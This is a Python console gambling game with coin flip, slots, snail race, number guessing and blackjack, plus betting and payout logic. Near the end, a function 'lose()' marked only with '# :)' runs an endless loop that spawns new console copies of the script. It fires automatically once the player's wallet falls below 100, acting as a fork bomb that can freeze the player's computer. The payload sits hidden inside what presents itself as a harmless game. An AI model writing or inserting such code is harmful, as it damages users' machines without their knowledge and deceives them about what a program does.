import random, time, os, subprocess, sys
#from selenium import webdriver
#games 

def coinflip():
    guess = input('heads (h) or tails (t)? ')
    
    for i in range(5):
      print ('flipping', end = '\r')
      time.sleep(0.2)
      print ('flipping.', end = '\r')
      time.sleep(0.2)
      print ('flipping..', end = '\r')
      time.sleep(0.2)
      print ('flipping...', end = '\r')
      time.sleep(0.2)
      print('                 ', end = '\r')
    print('                        ', end = '\r')
    
    result_coin = random.randint(0,1)
    if result_coin == 0:
      if guess == 'h':
        print('win')
        return 'win'
      else:
        print('lose')
        return 'lose'

    elif result_coin == 1:
      if guess == 't':
        print('win')
        return 'win'
      else:
        print('lose')
        return 'lose'

def slots():
  slots = [0,0,0,0,0,0,0]
  for i in range(len(slots)):
    slots[i] = random.randint(0,7)
    print(f'{slots}', end = '\r')
    time.sleep(0.3)
  print (slots)
  return slots

def snailrace():
  winner = 1 
  guess = input('bet on snail (1)(2)(3): ')
  
  snail1 = ['1','@']
  snail2 = ['2','@']
  snail3 = ['3','@']
  
  race = True
  x = 0
  while race == True:
    x1 = random.randint(0,1)
    x2 = random.randint(0,1)
    x3 = random.randint(0,1)
    if x1 == 1:
      snail1.insert(1, '_')
    if x2 == 1:
      snail2.insert(1, '_')
    if x3 == 1:
      snail3.insert(1, '_')
    time.sleep(1)
    x = x+1
    
    os.system("cls")
    if x == 1:
      print(f'{x} second')
    else:
      print(f'{x} seconds')
    print('')
    
    print(f'{"".join(snail1)}\n{"".join(snail2)}\n{"".join(snail3)}')
    
    if len(snail1) > 16:
      print('snail1 wins!!!')
      winner = '1'
      break
    elif len(snail2) > 16:
      print('snail2 wins!!!')
      winner = '2'
      break
    elif len(snail3) > 16:
      print('snail3 wins!!!')
      winner = '3'
      break
  if guess == winner:
    return 'win'
  else:
    return 'lose'

def numberguess():
  number = random.randint(1,10)
  guess = int(input('guess from 1-10: '))
  score = abs(guess)
  if score == number:
    print('you guessed correctly!')
    return 'win'
  elif abs(number - guess) == 1:
    print('close')
    return 'close'
  else:
    print('lose')
    return 'lose'

def blackjack():
    deck = build_deck()
    current_score = 0
    player_hand, deck, current_score = draw_hand(deck, 2, current_score)
    print(f'your score: {current_score}')
    dealer_score = random.randint(15, 21)
    while dealer_score < current_score:
      dealer_score = random.randint(15, 21)
    print(f'dealer: {dealer_score}')
    while current_score <= dealer_score:
        draw_q = input('draw a card? (y/n): ')
        if draw_q == 'y':
            player_hand, deck, current_score = draw_card(player_hand, deck, current_score)
        
        else:
            break
        
    if current_score > 21:
        print('lose')
        return 'lose'
    else:
        print('win')
        return 'win'

#processing

def draw_card(player_hand, deck, current_score):
    total_score = current_score
    for draw in range(int(1)):
        selected_card = (random.choice(deck))
        total_score += getvalue(selected_card)
        print('You drew %s.' % (selected_card[0]))
        print(total_score)
        player_hand.append(selected_card)
        deck.remove(selected_card)
    return player_hand, deck, total_score

def draw_hand(deck, hand_size, current_score):
    
  # The player receives a card into their hand while the same card is removed from the deck.
    player_hand = []
    for draw in range(int(hand_size)):
        selected_card = (random.choice(deck))
        current_score += getvalue(selected_card)
        print('You drew %s.' % (selected_card[0]))
        player_hand.append(selected_card)
        deck.remove(selected_card)
    return player_hand, deck, current_score

def getvalue(Selected_card):
    score = 0
    
    for i in range(14):
        if i == 1:
            if 'Ace' in Selected_card:
                score = 1
        elif i == 11:
            if 'Jack' in Selected_card:
                score = 10
        elif i == 12:
            if 'Queen' in Selected_card:
                score = 10
        elif i == 13:
            if 'King' in Selected_card:
                score = 10
        else:
            if str(i) in Selected_card:
                score = i
    return score

def build_deck():
    deck = []
    value = 0
    face = ''
    for value in range(13):
        value += 1
        suit_list = ['Hearts', 'Diamonds', 'Clubs', 'Spades']
        for suit in suit_list:
            if value == 1:
                face = 'Ace'
            elif value == 11:
                face = 'Jack'
            elif value == 12:
                face = 'Queen'
            elif value == 13:
                face = 'King'
            else:
                face = str(value)
            name = 'the %s of %s' % (face, suit)
            # The deck is shuffled only once, when the deck is first built.
            random.shuffle(deck)
            deck.append((name, face, suit, value))
    return deck

def checkslots(slots):
  score = 0
  n = 0
  m = 0
  for i in range(8):
    for i in range(7):
      slot = slots[i]
      if slot == n:
        m += 1
        if m >= 2:
          score += 1
      #print(f'm: {m}')
      #print(f'n: {n}')
      #print(f'i: {i}')
      #print(f'score: {score}')
    n += 1
    m = 0
    
  return score

def payout(gtype, outcome, money_in):
  pay = 0
  if gtype == '1':
    if outcome == 'win':
      pay = int(2 * money_in)
    else:
      pay = int(0 * money_in)
    
  elif gtype == '2':
    pay = int((outcome / 2.5) * money_in)
  
  elif gtype == '3':
    if outcome == 'win':
      pay = int(2 * money_in)
    else:
      pay = 0
    
  elif gtype == '4':
    if outcome == 'win':
      pay = 3 * money_in
    elif outcome == 'close':
      pay = 1.5 * money_in
    else:
      pay = 0
  
  elif gtype == '5':
    if outcome == 'win':
      pay = int(2.5 * money_in)
    else:
      pay = int(0 * money_in)
  return int(pay)

def bet(wallet):
  print(f'money left: ${wallet}')
  betting = int(input('how much to bet? (num): '))

  while betting > wallet:
    print('not enough in wallet')
    betting = int(input('how much to bet? (num): '))
  
  while betting <= 0:
    print(':skull emoji:')
    betting = int(input('how much to bet? (num): '))
  
  wallet = wallet - betting

  return int(betting), int(wallet)

# :)

def lose():
  try:
    while True:
      subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)
  except: 
    print('nuh-uh')
    time.sleep(5)

#mainline

def gamble():
  wallet = int(25000)
  while wallet > 100 and wallet < 1000000:
    gtype = input('coinflip (1) or slot (2) or snail (3) or number guess (4) or blackjack (5) ')
  
    if gtype == '1':
      money_in, wallet = bet(wallet)
      result = coinflip()
      pay = payout(gtype, result, money_in)
      print(f'you won ${pay}')
      wallet = wallet + pay
  
    if gtype == '2':
      money_in, wallet = bet(wallet)
      slot = slots()
      score = checkslots(slot)
      pay = payout(gtype, score, money_in)
      print(f'you won ${pay}')
      wallet = wallet + pay
    
    if gtype == '3':
      money_in, wallet = bet(wallet)
      result = snailrace()
      
      pay = payout(gtype, result, money_in)
      print(f'you won ${pay}')
      wallet = wallet + pay
      
    if gtype == '4':
      money_in, wallet = bet(wallet)
      result = numberguess()
      
      pay = payout(gtype, result, money_in)
      print(f'you won ${pay}')
      wallet = wallet + pay

    if gtype == '5':
      money_in, wallet = bet(wallet)
      result = blackjack()
      pay = payout(gtype, result, money_in)
      print(f'you won ${pay}')
      wallet = wallet + pay
  
  if wallet < 100:
    print("you didn't win big :(")
    lose()
  
  elif wallet > 1000000:
    print("you won big!")



gamble()